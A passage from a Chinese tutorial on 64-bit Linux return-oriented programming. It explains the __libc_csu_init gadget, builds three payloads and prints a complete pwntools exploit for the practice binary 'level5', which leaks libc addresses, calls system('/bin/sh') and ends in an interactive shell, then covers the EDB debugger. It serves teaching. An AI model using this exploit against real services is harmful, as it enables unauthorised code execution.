 <p> <span>#!bash</span> <br /> <span>00000000004005a0 &lt;__libc_csu_init&gt;:</span> <br /> <span>&nbsp; 4005a0: &nbsp; 48 89 6c 24 d8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%rbp,-0x28(%rsp)</span> <br /> <span>&nbsp; 4005a5: &nbsp; 4c 89 64 24 e0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r12,-0x20(%rsp)</span> <br /> <span>&nbsp; 4005aa: &nbsp; 48 8d 2d 73 08 20 00 &nbsp; &nbsp;lea &nbsp; &nbsp;0x200873(%rip),%rbp &nbsp; &nbsp; &nbsp; &nbsp;# 600e24 &lt;__init_array_end&gt;</span> <br /> <span>&nbsp; 4005b1: &nbsp; 4c 8d 25 6c 08 20 00 &nbsp; &nbsp;lea &nbsp; &nbsp;0x20086c(%rip),%r12 &nbsp; &nbsp; &nbsp; &nbsp;# 600e24 &lt;__init_array_end&gt;</span> <br /> <span>&nbsp; 4005b8: &nbsp; 4c 89 6c 24 e8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r13,-0x18(%rsp)</span> <br /> <span>&nbsp; 4005bd: &nbsp; 4c 89 74 24 f0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r14,-0x10(%rsp)</span> <br /> <span>&nbsp; 4005c2: &nbsp; 4c 89 7c 24 f8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r15,-0x8(%rsp)</span> <br /> <span>&nbsp; 4005c7: &nbsp; 48 89 5c 24 d0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%rbx,-0x30(%rsp)</span> <br /> <span>&nbsp; 4005cc: &nbsp; 48 83 ec 38 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sub &nbsp; &nbsp;$0x38,%rsp</span> <br /> <span>&nbsp; 4005d0: &nbsp; 4c 29 e5 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sub &nbsp; &nbsp;%r12,%rbp</span> <br /> <span>&nbsp; 4005d3: &nbsp; 41 89 fd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%edi,%r13d</span> <br /> <span>&nbsp; 4005d6: &nbsp; 49 89 f6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%rsi,%r14</span> <br /> <span>&nbsp; 4005d9: &nbsp; 48 c1 fd 03 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sar &nbsp; &nbsp;$0x3,%rbp</span> <br /> <span>&nbsp; 4005dd: &nbsp; 49 89 d7 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%rdx,%r15</span> <br /> <span>&nbsp; 4005e0: &nbsp; e8 1b fe ff ff &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;callq &nbsp;400400 &lt;_init&gt;</span> <br /> <span>&nbsp; 4005e5: &nbsp; 48 85 ed &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;test &nbsp; %rbp,%rbp</span> <br /> <span>&nbsp; 4005e8: &nbsp; 74 1c &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je &nbsp; &nbsp; 400606 &lt;__libc_csu_init+0x66&gt;</span> <br /> <span>&nbsp; 4005ea: &nbsp; 31 db &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xor &nbsp; &nbsp;%ebx,%ebx</span> <br /> <span>&nbsp; 4005ec: &nbsp; 0f 1f 40 00 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; nopl &nbsp; 0x0(%rax)</span> <br /> <span>&nbsp; 4005f0: &nbsp; 4c 89 fa &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r15,%rdx</span> <br /> <span>&nbsp; 4005f3: &nbsp; 4c 89 f6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r14,%rsi</span> <br /> <span>&nbsp; 4005f6: &nbsp; 44 89 ef &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;%r13d,%edi</span> <br /> <span>&nbsp; 4005f9: &nbsp; 41 ff 14 dc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; callq &nbsp;*(%r12,%rbx,8)</span> <br /> <span>&nbsp; 4005fd: &nbsp; 48 83 c3 01 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp;$0x1,%rbx</span> <br /> <span>&nbsp; 400601: &nbsp; 48 39 eb &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cmp &nbsp; &nbsp;%rbp,%rbx</span> <br /> <span>&nbsp; 400604: &nbsp; 75 ea &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp;4005f0 &lt;__libc_csu_init+0x50&gt;</span> <br /> <span>&nbsp; 400606: &nbsp; 48 8b 5c 24 08 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x8(%rsp),%rbx</span> <br /> <span>&nbsp; 40060b: &nbsp; 48 8b 6c 24 10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x10(%rsp),%rbp</span> <br /> <span>&nbsp; 400610: &nbsp; 4c 8b 64 24 18 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x18(%rsp),%r12</span> <br /> <span>&nbsp; 400615: &nbsp; 4c 8b 6c 24 20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x20(%rsp),%r13</span> <br /> <span>&nbsp; 40061a: &nbsp; 4c 8b 74 24 28 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x28(%rsp),%r14</span> <br /> <span>&nbsp; 40061f: &nbsp; 4c 8b 7c 24 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;mov &nbsp; &nbsp;0x30(%rsp),%r15</span> <br /> <span>&nbsp; 400624: &nbsp; 48 83 c4 38 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; add &nbsp; &nbsp;$0x38,%rsp</span> <br /> <span>&nbsp; 400628: &nbsp; c3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;retq &nbsp;&nbsp;</span> <br /> </p> 
 <p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx*8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p> 
 <p>我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是call qword ptr [r12+rbx*8]，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p> 
 <p> <span>#!bash</span> <br /> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#write(rdi=1, rsi=write.got, rdx=4)</span> <br /> <span>payload1 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload1 += &quot;\x00&quot;*56</span> <br /> <span>payload1 += p64(main)</span> </p> 
 <p>当我们exp在收到write()在内存中的地址后，就可以计算出system()在内存中的地址了。接着我们构造payload2，利用read()将system()的地址以及“/bin/sh”读入到.bss段内存中。</p> 
 <p> <span>#!bash</span> <br /> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#read(rdi=0, rsi=bss_addr, rdx=16)</span> <br /> <span>payload2 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload2 += &quot;\x00&quot;*56</span> <br /> <span>payload2 += p64(main)</span> <br /> </p> 
 <p>最后我们构造payload3,调用system()函数执行“/bin/sh”。注意，system()的地址保存在了.bss段首地址上，“/bin/sh”的地址保存在了.bss段首地址+8字节上。</p> 
 <p> <span>#!bash</span> <br /> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span> <br /> <span>payload3 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload3 += &quot;\x00&quot;*56</span> <br /> <span>payload3 += p64(main)</span> <br /> </p> 
 <p>最终exp如下：</p> 
 <p> <span>#!python</span> <br /> <span>#!/usr/bin/env python</span> <br /> <span>from pwn import *</span> </p> 
 <p> <span> <br /> </span> <span>elf = ELF('level5')</span> <br /> <span>libc = ELF('libc.so.6')</span> </p> 
 <p> <span> <br /> </span> <span>p = process('./level5')</span> <br /> <span>#p = remote('127.0.0.1',10001)</span> </p> 
 <p> <span> <br /> </span> <span>got_write = elf.got['write']</span> <br /> <span>print &quot;got_write: &quot; + hex(got_write)</span> <br /> <span>got_read = elf.got['read']</span> <br /> <span>print &quot;got_read: &quot; + hex(got_read)</span> </p> 
 <p> <span> <br /> </span> <span>main = 0x400564</span> </p> 
 <p> <span> <br /> </span> <span>off_system_addr = libc.symbols['write'] - libc.symbols['system']</span> <br /> <span>print &quot;off_system_addr: &quot; + hex(off_system_addr)</span> </p> 
 <p> <span> <br /> </span> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#write(rdi=1, rsi=write.got, rdx=4)</span> <br /> <span>payload1 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload1 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload1 += &quot;\x00&quot;*56</span> <br /> <span>payload1 += p64(main)</span> </p> 
 <p> <span> <br /> </span> <span>p.recvuntil(&quot;Hello, World\n&quot;)</span> </p> 
 <p> <span> <br /> </span> <span>print &quot;\n#############sending payload1#############\n&quot;</span> <br /> <span>p.send(payload1)</span> <br /> <span>sleep(1)</span> </p> 
 <p> <span> <br /> </span> <span>write_addr = u64(p.recv(8))</span> <br /> <span>print &quot;write_addr: &quot; + hex(write_addr)</span> </p> 
 <p> <span> <br /> </span> <span>system_addr = write_addr - off_system_addr</span> <br /> <span>print &quot;system_addr: &quot; + hex(system_addr)</span> </p> 
 <p> <span> <br /> </span> <span>bss_addr=0x601028</span> </p> 
 <p> <span> <br /> </span> <span>p.recvuntil(&quot;Hello, World\n&quot;)</span> </p> 
 <p> <span> <br /> </span> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#read(rdi=0, rsi=bss_addr, rdx=16)</span> <br /> <span>payload2 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload2 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload2 += &quot;\x00&quot;*56</span> <br /> <span>payload2 += p64(main)</span> </p> 
 <p> <span> <br /> </span> <span>print &quot;\n#############sending payload2#############\n&quot;</span> <br /> <span>p.send(payload2)</span> <br /> <span>sleep(1)</span> </p> 
 <p> <span> <br /> </span> <span>p.send(p64(system_addr))</span> <br /> <span>p.send(&quot;/bin/sh\0&quot;)</span> <br /> <span>sleep(1)</span> </p> 
 <p> <span> <br /> </span> <span>p.recvuntil(&quot;Hello, World\n&quot;)</span> </p> 
 <p> <span> <br /> </span> <span>#rdi= &nbsp;edi = r13, &nbsp;rsi = r14, rdx = r15&nbsp;</span> <br /> <span>#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span> <br /> <span>payload3 = &nbsp;&quot;\x00&quot;*136</span> <br /> <span>payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) # pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span> <br /> <span>payload3 += p64(0x4005F0) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span> <br /> <span>payload3 += &quot;\x00&quot;*56</span> <br /> <span>payload3 += p64(main)</span> </p> 
 <p> <span> <br /> </span> <span>print &quot;\n#############sending payload3#############\n&quot;</span> </p> 
 <p> <span> <br /> </span> <span>sleep(1)</span> <br /> <span>p.send(payload3)</span> </p> 
 <p> <span> <br /> </span> <span>p.interactive()</span> <br /> </p> 
 <p>要注意的是，当我们把程序的io重定向到socket上的时候，根据网络协议，因为发送的数据包过大，read()有时会截断payload，造成payload传输不完整造成攻击失败。这时候要多试几次即可成功。如果进行远程攻击的话，需要保证ping值足够小才行（局域网）。最终执行结果如下：</p> 
 <p> <span>#!bash</span> <br /> <span>$ python exp7.py&nbsp;</span> <br /> <span>[+] Started program './level5'</span> <br /> <span>got_write: 0x601000</span> <br /> <span>got_read: 0x601008</span> <br /> <span>off_system_addr: 0xa1c40</span> </p> 
 <p> <span> <br /> </span> <span>#############sending payload1#############</span> </p> 
 <p> <span> <br /> </span> <span>write_addr: 0x7f79d5779370</span> <br /> <span>system_addr: 0x7f79d56d7730</span> </p> 
 <p> <span> <br /> </span> <span>#############sending payload2#############</span> </p> 
 <p> <span> <br /> </span> <span>#############sending payload3#############</span> </p> 
 <p> <span> <br /> </span> <span>[*] Switching to interactive mode</span> <br /> <span>$ whoami</span> <br /> <span>mzheng</span> <br /> </p> 
 <h2> <span> <strong>六、EDB调试器</strong> </span> </h2> 
 <p> <span> 我们在学习Linux ROP的过程中一定少不了调试这一环节，虽然gdb的功能很强大，但命令行界面对很多人来说并不友好。很多学习Windows调试的人用惯了ollydbg再接触gdb的话总感觉很难上手。其实在linux下也有类似于ollydbg的调试工具，那就是 <strong> <span>EDB-debugger</span> </strong> 。这里给出edb的下载地址，具体的编译请参考readme： </span> <span>EDB-debugger https://github.com/eteran/edb-debugger</span> </p> 
 <p>下面我们就拿level5做例子来讲解一下如何使用EDB。首先是挂载(attach)进程和设置断点(break point)。我们知道当我们在用exp.py脚本进行攻击的时候，脚本会一直运行，我们并没有足够的时间进行挂载操作。想要进行调试的话我们需要让脚本暂停一下，随后再进行挂载。暂停的方法很简单，只需要在脚本中加一句”raw_input()”即可。比如说我们想在发送payload1之前暂停一下脚本，只需要这样：</p> 
 <p> <span>ss = raw_input()</span> <br /> <span>print &quot;\n#############sending payload1#############\n&quot;</span> <br /> <span>p.send(payload1)</span> <br /> </p> 
 <p>这样的话，当脚本运行起来后，就会在raw_input()这一行停下来，等待用户输入。这时候我们就可以启动EDB进行挂载了。</p> 
 <p> <span> <img src="http://img2.tuicool.com/I73aEjJ.png!web" class="alignCenter" /> </span> </p> 
 <p>使用EDB进行挂载非常简单，输入进程名点ok即可。</p> 
 <p> <img src="http://img2.tuicool.com/2IzYBnN.png!web" class="alignCenter" /> <br /> </p> 
 <p>挂载上以后就可以设置断点了。首先在调试窗口按”ctrl + g”就可以跳转到目标地址，我们这里将地址设置为0x400610，也就是第一个gadget的地址。</p> 
 <p> <img src="http://img1.tuicool.com/MfyI3iu.png!web" class="alignCenter" /> <br /> </p> 
 <p>接着我们在0x400610这个地址前双击，就可以看到一个红点，说明我们已经成功的下了断点。接着按“F9”或者点击”Run”就可以让程序继续运行了。</p> 
 <p>虽然程序继续运行了，但是脚本还在继续等待用户的输入，这时候只需要在命令行按一下回车，程序就会继续运行，随后会暂停在”0x400610”这个断点。</p> 
 <p> <img src="http://img0.tuicool.com/nmaABzV.png!web" class="alignCenter" /> <br /> </p> 
 <p>接着我们可以按”F8”或者”F7”进行单步调试，主窗口会显示pc将要执行的指令以及执行后的结果。右边会看到各个寄存器的值。注意，在寄存器（比如说RSP）的值上点击右键，可以选择”follow in dump”，随后就在data dump窗口就能看到这个地址上对应数据是什么了。除此之外，EDB还支持动态修改内存数据，当你选中数据后，可以右键，选择”Edit Bytes”，就可以对选中的数据进行动态修改。</p> 
 <p>以上介绍的只是EDB的一些基本操作，在随后的章节中我们还会结合其他例子继续介绍一些EDB的高级用法。</p> 
 <h2> <span> <strong>七、小结</strong> </span> </h2> 
 <p>可以说ROP最大的艺术就是在于gadgets千变万化的组合了。因为篇幅原因我们准备将如何寻找以及组合gadgets的技巧留到随后的文章中去介绍。欢迎大家到时继续学习。</p> 
 <h2> <span> <strong>八、参考资料</strong> </span> </h2> 
 <p> <span> <a href="http://drops.wooyun.org/tips/2288" rel="nofollow,noindex" target="_blank">64位Linux下的栈溢出</a> </span> </p> 
 <p> <span> <a href="https://blog.leoc.io/blog/20140414/week4-bigdata-writeup/" rel="nofollow,noindex" target="_blank">Week4-bigdata-丘比龙版银河系最详细Writeup!</a> </span> </p> 
 <p> 作者：蒸米@阿里聚安全，更多安全类技术文章，请访问阿里聚安全博客 </p> 
</div>
        </div>
        <div class="article_social">
         <div class="article_like">
    <div class="circle circle-like" id="my_zan" data_id="qmUbiin">  </div>

</div>
        <div id="share_weixin_image">
            <img width="100px" height="100px" src="http://s.jiathis.com/qrcode.php?url=http://www.tuicool.com/articles/qmUbiin?via=wechat_qr">
        </div>
<div class="article_share_fav">
    <div class="share" id="ckepop">
        <span>分享</span>
        <button class="share_weibo" id="share_weibo_id"  title="分享到新浪微博"></button>
        <button class="share_qq" id="share_qq_id"  title="分享到QQ空间"></button>
        <button class="share_weixin" id="share_weixin_id"></button>
    </div>
    <div class="fav_correct">
        <button id="my_fav" data_id="qmUbiin">
            <i class="icon icon-star-empty"></i> <span id="fav_tip">收藏</span>
        </button>
        <button id="article-correct" data_id="qmUbiin" uid="462071652">
            <i class="icon icon-warning-sign"></i>
            <span>纠错</span>
        </button>
    </div>
</div>
<script type="text/javascript">
$("#share_weibo_id").click( function() {
   window.open("http://share.baidu.com/s?type=text&searchPic=0&sign=on&to=tsina&url=http://www.tuicool.com/articles/qmUbiin&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87++%28%E5%88%86%E4%BA%AB%E8%87%AA+%40%E6%8E%A8%E9%85%B7%E7%BD%91%29&key=3113829255");
});
$("#share_qq_id").click( function() {
   window.open("http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.tuicool.com/articles/qmUbiin&title=%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Blinux_x64%E7%AF%87&desc=&summary=&site=");
});
$("#share_weixin_id").click( function() {
  $("#share_weixin_image").toggle();
});
</script>


        </div>
        <div id="site_articles" style="clear:both;">
              <div class="article-part-title">
                <span>推荐文章</span>
              </div>
          <ul class="side_article_list">
                <li class="side_article_list_item">
                    1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛">
                    掌握这17个tar命令实例让你秒变大牛
                    </a>
                </li>
                <li class="side_article_list_item">
                    2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数">
                    实例详解 Linux 中的 fork() 函数
                    </a>
                </li>
                <li class="side_article_list_item">
                    3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试">
                    每日一博 | 关于 CPU 亲和性的测试
                    </a>
                </li>
                <li class="side_article_list_item">
                    4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9">
                    SIGKILL信号linux下kill进程 -9
                    </a>
                </li>
                <li class="side_article_list_item">
                    5.<a href="/articles/j6Bfuqv" target="_blank" title="堡垒跳板机实现——架构实现">
                    堡垒跳板机实现——架构实现
                    </a>
                </li>
                <li class="side_article_list_item">
                    6.<a href="/articles/FNjAvab" target="_blank" title="ELF文件格式分析">
                    ELF文件格式分析
                    </a>
                </li>
          </ul>
        </div>
        <div id="kan_articles"></div>
        <div id="article_weibo" style="display:none;">
            <div class='article-part-title'>
                <span>相关微博</span>
                <sub>
                    <a href="/articles/weibo_list/qmUbiin" target="_blank">(<i id="weibo_num"></i>)</a> 
               </sub>
            </div>
            <div class="related-weibo-list"></div>
        </div>
        <div class="comments">
    <div class="comments-area">
    <div class="comments-header">
        <h5>我来评几句</h5>
        <div class="alert comment-alert alert-error" style="display:none;">
            错误
        </div>
           <textarea name="comment[body]" id="comment-body" cols="60" rows="6" placeholder="请输入评论内容..." style="resize: none;"></textarea>
           <a href="javascript:commentsub();" class="btn btn-medium btn-submit" id="comment-submit">发表评论</a>
        <p style="margin-top: 5px;margin-left:10px;">
            已发表评论数(<span class="comment_cnt"></span>)
        </p>
    </div>
    <div class="comments-list">
        <div class="empty-cmts alert alert-success" style="display:none;">
            没有更多评论了^^
        </div>
    </div>
    <div class="more-comments" style="display:none;">
        <a href="">更多评论</a>
    </div>
    <div class="load-fail">
        评论加载失败，<a href="javascript:reload_comments('qmUbiin',1,0,1);">重新加载</a>
        <img src="http://static1.tuicool.com//images/spinner.gif" id="spinner3"/>
    </div>
    </div>
</div>

    </div>
        <div class="span4 article_right_side">
            <div class="article_related_site article_detail_bg">
    <h4 class="article-part-title">相关站点</h4>
    <div class="article_related_site_body clearfix">
        <div class="logo">
            <img src="http://stimg1.tuicool.com/biau6bq.png"/>
        </div>
        <div class="name">
            <div>
                <a href="/sites/biau6bq" target="_blank"> 阿里聚安全</a>
            </div>
            <div>
                <div class="btn btn-success right_site_follow" id="my_follow" data_id="biau6bq">＋订阅</div>
            </div>
        </div>
    </div>
</div>

<div id="right_site_articles" class="article_detail_bg">
    <div class="article-part-title">
        <span>热门文章</span>
    </div>
    <ul class="side_article_list">
        <li class="side_article_list_item">
            1.<a href="/articles/vEvmYv2" target="_blank" title="掌握这17个tar命令实例让你秒变大牛"> 掌握这17个tar命令实例让你秒变大牛 </a>
        </li>
        <li class="side_article_list_item">
            2.<a href="/articles/JfUniia" target="_blank" title="实例详解 Linux 中的 fork() 函数"> 实例详解 Linux 中的 fork() 函数 </a>
        </li>
        <li class="side_article_list_item">
            3.<a href="/articles/InMBnyr" target="_blank" title="每日一博 | 关于 CPU 亲和性的测试"> 每日一博 | 关于 CPU 亲和性的测试 </a>
        </li>
        <li class="side_article_list_item">
            4.<a href="/articles/NbieYrz" target="_blank" title="SIGKILL信号linux下kill进程 -9"> SIGKILL信号linux下kill进程 -9 </a>
        </li>
        <li class="side_article_list_item">
            5.<a href="/articles/Z3UBvm6" target="_blank" title="GPG 密鑰的「正確」用法"> GPG 密鑰的「正確」用法 </a>
        </li>
    </ul>
</div>
<div class="right-link">
      <a href="http://www.toushibao.com/landing.html?utm_source=tuicoolwenzhang&utm_medium=guanggao&utm_campaign=tuicoolwenzhang.guanggao.tsbxgn" target="_blank"><img src="http://static1.tuicool.com/images/upload/jiankongbao120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://www.handone.com/?f=tc" target="_blank"><img src="http://static1.tuicool.com/images/upload/handone300.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.daocloud.io/cloud/voice.html?utm_source=tuicool&utm_medium=banner%20&utm_campaign=daovoicecampaign" target="_blank"><img src="http://static1.tuicool.com/images/upload/daocloud300.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 0px">
      <a href="https://www.jiguang.cn/devservice/?from=tuicool01" target="_blank"><img src="http://static1.tuicool.com/images/upload/jpush120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.teambition.com/?utm_source=tuicool&utm_medium=banner01" target="_blank"><img src="http://static2.tuicool.com/images/upload/teambition120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="https://www.jiandaoyun.com/?f=tc" target="_blank"><img src="http://static0.tuicool.com/images/upload/jiandaoyun120.jpg"/></a>

</div>
<div class="right-link" style="margin-top: 5px">
      <a href="http://click.aliyun.com/m/6128/" target="_blank"><img src="http://static1.tuicool.com/images/upload/aliyun120.jpg"/></a>

</div>

         </div>
</div>

<div>
   <!-- add_article to kan -->
<div id="add-article-to-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-header">
    <span class="add-title">收藏到推刊</span>
    <a href="#new-kan" class="btn pull-right" data-toggle="modal">创建推刊</a>
    <i class="clearfix"></i>
  </div>
  <div class="modal-body">
    <ul id="add-kan-list">
    </ul>
  </div>
  <div class="modal-footer">
    <input type="hidden" value="qmUbiin" class="article-id" /> 
    <button class="btn btn-primary pull-left add-to-btn">  收 藏  </button>
    <button class="btn" data-dismiss="modal" aria-hidden="true" style="margin-right: 15px">取消</button>
  </div>
</div>

   <div id="new-kan" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-body">
    <input type="text" name="name" id="new-kan-name"  placeholder="推刊名(必填)" required data-validation-required-message="请填写推刊名" />
    <span class="new-ness-name">请填写推刊名</span>
    <br/>
    <textarea name="desc" id="desc" rows="6" placeholder="推刊描述"></textarea>
    <span class="new-ness-desc">描述不能大于100个字符!</span>
    <br/>
    权限设置：<input type="radio" name="type" value="1" checked="checked" /> 公开
    <input type="radio" name="type" value="0"> 仅自己可见
  </div>
  <div class="modal-footer">
    <button class="btn btn-primary pull-left create-kan-btn" disabled>创建</button>
    <button class="btn dismiss-new-kan" data-dismiss="modal" aria-hidden="true">取消</button>
  </div>
</div>


</div>
<div id="article-correct-modal" class="modal hide fade in" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
    <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">
            &times;
        </button>
        <h3>文章纠错</h3>
    </div>
    <div class="modal-body">
        <input type="hidden" value="qmUbiin" id="article-correct-source">
        <div>
            <label for="article-correct-select">
                错误类型
            </label>
            <select id="article-correct-select">
                <option value="正文不准确">正文不准确</option>
                <option value="标题不准确">标题不准确</option>
                <option value="排版有问题">排版有问题</option>
                <option value="排版有问题">主题不准确</option>
                <option value="没有分页内容">没有分页内容</option>
                <option value="图片无法显示">图片无法显示</option>
                <option value="视频无法显示">视频无法显示</option>
                <option value="与原文不一致">与原文不一致</option>
            </select>
        </div>
        <div>
            <label for="article-correct-other">
                补充信息
            </label>
            <textarea id="article-correct-other" class="span4"></textarea>
        </div>
    </div>
    <div class="modal-footer">
        <button class="btn btn-primary pull-right huodong_correct_submit" id="article-correct-submit">
            &nbsp;&nbsp;提交&nbsp;&nbsp;
        </button>
    </div>
</div>
    <div class="share_zone">
    <div class="bdsharebuttonbox"> 
         <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
        <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
        <a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
        <a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a>
        <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
        <a href="#" class="bds_more" data-cmd="more"></a>
     </div>
    <script>
        window._bd_share_config = {
            "common" : {
                "bdSnsKey" : {
                    "tsina" : "3113829255",
                    "tqq" : "801536792"
                },
                "bdText" : "一步一步学ROP之linux_x64篇 (分享自 @推酷网)",
                "bdMini" : "2",
                "bdMiniList" : false,
                "bdPic" : "",
                "bdStyle" : "1",
                "bdSize" : "24"
            },
            "slide" : {
